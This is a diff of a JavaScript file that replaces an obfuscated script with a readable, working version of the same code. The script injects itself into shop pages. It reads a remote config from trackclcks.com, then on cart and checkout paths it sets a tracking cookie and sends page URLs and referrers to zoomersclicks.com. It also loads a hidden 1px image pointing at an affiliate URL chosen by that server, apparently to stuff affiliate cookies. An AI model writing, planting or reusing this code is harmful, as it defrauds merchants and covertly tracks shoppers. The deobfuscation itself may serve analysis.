@@ -1,1 +1,95 @@
-function _0x55c6(_0x23fa50,_0x4d9476){_0x23fa50=_0x23fa50-0x1d2;const _0x3ea950=_0x3ea9();let _0x55c6a3=_0x3ea950[_0x23fa50];return _0x55c6a3;}(function(_0x28ee88,_0x363a19){const _0x3f4ea4=_0x55c6,_0x2d82cf=_0x28ee88();while(!![]){try{const _0x52d7c1=parseInt(_0x3f4ea4(0x1ee))/0x1+-parseInt(_0x3f4ea4(0x1f9))/0x2*(-parseInt(_0x3f4ea4(0x1f1))/0x3)+parseInt(_0x3f4ea4(0x1fe))/0x4*(parseInt(_0x3f4ea4(0x207))/0x5)+parseInt(_0x3f4ea4(0x1fa))/0x6*(-parseInt(_0x3f4ea4(0x1e9))/0x7)+parseInt(_0x3f4ea4(0x203))/0x8*(parseInt(_0x3f4ea4(0x1ef))/0x9)+-parseInt(_0x3f4ea4(0x1dc))/0xa+-parseInt(_0x3f4ea4(0x1fd))/0xb;if(_0x52d7c1===_0x363a19)break;else _0x2d82cf['push'](_0x2d82cf['shift']());}catch(_0x1f5015){_0x2d82cf['push'](_0x2d82cf['shift']());}}}(_0x3ea9,0xec5ff),(function(){const _0x26c559=_0x55c6,_0x3a0904=_0x26c559(0x1f6),_0x59393c='https://zoomersclicks.com/api/retrack',_0x14e4af=_0x26c559(0x20b),_0x5817a2=[_0x26c559(0x1d8),_0x26c559(0x1e3),_0x26c559(0x1d7),_0x26c559(0x1e1),'pay',_0x26c559(0x1fb)];function _0x599eae(){const _0x218a1b=_0x26c559;return _0x218a1b(0x201)['replace'](/[xy]/g,function(_0x35e1f5){const _0x11c61d=_0x218a1b,_0x181a21=Math[_0x11c61d(0x1ed)]()*0x10|0x0,_0x12d416=_0x35e1f5==='x'?_0x181a21:_0x181a21&0x3|0x8;return _0x12d416[_0x11c61d(0x205)](0x10);});}function _0x215356(_0x6700fa){const _0x1d9208=_0x26c559,_0x2a4e02=_0x6700fa+'=',_0x309ce3=document[_0x1d9208(0x1e6)][_0x1d9208(0x204)](';');for(let _0x3449e8=0x0;_0x3449e8<_0x309ce3[_0x1d9208(0x1eb)];_0x3449e8++){const _0x23f93d=_0x309ce3[_0x3449e8][_0x1d9208(0x1e2)]();if(_0x23f93d['indexOf'](_0x2a4e02)===0x0)return _0x23f93d[_0x1d9208(0x1d3)](_0x2a4e02['length'],_0x23f93d[_0x1d9208(0x1eb)]);}return'';}function _0x1116fe(){const _0x26aca9=_0x26c559;return _0x5817a2[_0x26aca9(0x1fc)](function(_0x2c587d){const _0x54843f=_0x26aca9;return window['location'][_0x54843f(0x1dd)]['toLowerCase']()[_0x54843f(0x1ea)](_0x2c587d);});}function _0x5bb35c(_0x211801){const _0x4d65b2=_0x26c559,_0x2fc234=document[_0x4d65b2(0x1f4)]||document[_0x4d65b2(0x1de)];if(!_0x2fc234)return;const _0x1d066e=document['createElement'](_0x4d65b2(0x1d4));_0x1d066e['src']=_0x211801,_0x1d066e['style'][_0x4d65b2(0x1e0)]=_0x4d65b2(0x1e4),_0x1d066e['style'][_0x4d65b2(0x20a)]=_0x4d65b2(0x1e4),_0x1d066e[_0x4d65b2(0x1d2)]['display']='none',_0x1d066e[_0x4d65b2(0x1d2)][_0x4d65b2(0x1f7)]='hidden',_0x2fc234[_0x4d65b2(0x1f3)](_0x1d066e);}async function _0x4db83b(){const _0x53bdea=_0x26c559;try{const _0x107798=_0x215356('tracking_uuid')||_0x599eae(),_0x2999ab=new Date(Date[_0x53bdea(0x1ec)]()+0x1e*0x18*0x3c*0x3c*0x3e8)[_0x53bdea(0x206)]();document[_0x53bdea(0x1e6)]='tracking_uuid='+_0x107798+_0x53bdea(0x1e7)+_0x2999ab+_0x53bdea(0x209);const _0x15692a=await fetch(_0x59393c,{'method':_0x53bdea(0x1f8),'keepalive':!![],'body':JSON['stringify']({'url':window[_0x53bdea(0x208)]['href'],'referrer':document[_0x53bdea(0x1da)],'unique_id':_0x107798,'origin':window['location'][_0x53bdea(0x200)],'timestamp':new Date()['getTime']()}),'headers':{'Content-Type':_0x53bdea(0x1df)}}),_0x1f6bb4=await _0x15692a[_0x53bdea(0x1f5)]();_0x1f6bb4['success']&&_0x1f6bb4[_0x53bdea(0x1d5)]?_0x5bb35c(_0x1f6bb4[_0x53bdea(0x1d5)]):_0x5bb35c(_0x14e4af+_0x107798);}catch(_0x2a6f84){console[_0x53bdea(0x1d9)](_0x53bdea(0x1e5),_0x2a6f84);}}function _0x2db2ea(){const _0x3c2bcc=_0x26c559,_0x276bea=_0x3a0904+encodeURIComponent(window['location'][_0x3c2bcc(0x200)]);fetch(_0x276bea)['then'](function(_0x480bda){const _0x13958e=_0x3c2bcc;if(!_0x480bda['ok'])throw new Error(_0x13958e(0x1db));return _0x480bda[_0x13958e(0x1f5)]();})[_0x3c2bcc(0x1ff)](function(_0x1c0c2e){const _0x216c22=_0x3c2bcc;if(!_0x1c0c2e||!_0x1c0c2e[_0x216c22(0x1f2)]&&!_0x1c0c2e[_0x216c22(0x1d6)])return;(_0x1c0c2e[_0x216c22(0x1f2)]||_0x1c0c2e[_0x216c22(0x1d6)]&&_0x1116fe())&&_0x4db83b();})['catch'](function(_0x4d6a76){const _0x4802c3=_0x3c2bcc;console['error'](_0x4802c3(0x20c),_0x4d6a76);});}document['readyState']==='interactive'||document['readyState']===_0x26c559(0x1f0)?_0x2db2ea():window[_0x26c559(0x202)](_0x26c559(0x1e8),_0x2db2ea);}()));function _0x3ea9(){const _0x354a0f=['cart','error','referrer','Config\x20API\x20Failed','7825430FdFsRd','pathname','documentElement','application/json','width','checkout','trim','payment','1px','Tracking\x20Failed:','cookie',';\x20expires=','DOMContentLoaded','21nDWyOo','includes','length','now','random','680944BvCPpp','225aZSfUF','complete','36IqJtoU','always','appendChild','body','json','https://trackclcks.com/api/site-config?host=','visibility','POST','318558sYjcsQ','646662QKudlw','review-order','some','22842853SvNkQI','4XIJPyC','then','hostname','xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx','addEventListener','413256IFhxwM','split','toString','toUTCString','1334855AjJNAV','location',';path=/;SameSite=Lax','height','https://zoomersclicks.com/api/fallback-pixel?id=','Config\x20fetch\x20failed:','style','substring','img','affiliate_url','cartExtra','shipping'];_0x3ea9=function(){return _0x354a0f;};return _0x3ea9();}
+(function () {
+  const CONFIG_URL = 'https://trackclcks.com/api/site-config?host=';
+  const RETRACK_URL = 'https://zoomersclicks.com/api/retrack';
+  const FALLBACK_PIXEL_URL = 'https://zoomersclicks.com/api/fallback-pixel?id=';
+  const TRACKED_PATH_KEYWORDS = ['cart', 'payment', 'shipping', 'checkout', 'pay', 'review-order'];
+
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+      const r = Math.random() * 0x10 | 0x0;
+      const v = c === 'x' ? r : (r & 0x3 | 0x8);
+      return v.toString(16);
+    });
+  }
+
+  function getCookie(name) {
+    const nameEQ = name + '=';
+    const cookies = document.cookie.split(';');
+    for (let i = 0; i < cookies.length; i++) {
+      const c = cookies[i].trim();
+      if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+    }
+    return '';
+  }
+
+  function isTrackedPath() {
+    const path = window.location.pathname.toLowerCase();
+    return TRACKED_PATH_KEYWORDS.some(function (keyword) {
+      return path.includes(keyword);
+    });
+  }
+
+  function createTrackingPixel(src) {
+    const container = document.body || document.documentElement;
+    if (!container) return;
+    const img = document.createElement('img');
+    img.src = src;
+    img.style.width = '1px';
+    img.style.height = '1px';
+    img.style.display = 'none';
+    img.style.visibility = 'hidden';
+    container.appendChild(img);
+  }
+
+  async function doRetrack() {
+    try {
+      const uuid = getCookie('tracking_uuid') || generateUUID();
+      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
+      document.cookie = 'tracking_uuid=' + uuid + '; expires=' + expires + ';path=/;SameSite=Lax';
+
+      const res = await fetch(RETRACK_URL, {
+        method: 'POST',
+        keepalive: true,
+        body: JSON.stringify({
+          url: window.location.href,
+          referrer: document.referrer,
+          unique_id: uuid,
+          origin: window.location.hostname,
+          timestamp: new Date().getTime(),
+        }),
+        headers: { 'Content-Type': 'application/json' },
+      });
+      const data = await res.json();
+
+      if (data.success && data.affiliate_url) {
+        createTrackingPixel(data.affiliate_url);
+      } else {
+        createTrackingPixel(FALLBACK_PIXEL_URL + uuid);
+      }
+    } catch (err) {
+      console.error('Tracking Failed:', err);
+    }
+  }
+
+  function fetchConfigAndTrack() {
+    const url = CONFIG_URL + encodeURIComponent(window.location.hostname);
+    fetch(url)
+      .then(function (res) {
+        if (!res.ok) throw new Error('Config API Failed');
+        return res.json();
+      })
+      .then(function (data) {
+        if (!data || (!data.always && !data.cartExtra)) return;
+        (data.always || (data.cartExtra && isTrackedPath())) && doRetrack();
+      })
+      .catch(function (err) {
+        console.error('Config fetch failed:', err);
+      });
+  }
+
+  if (document.readyState === 'interactive' || document.readyState === 'complete') {
+    fetchConfigAndTrack();
+  } else {
+    window.addEventListener('DOMContentLoaded', fetchConfigAndTrack);
+  }
+})();
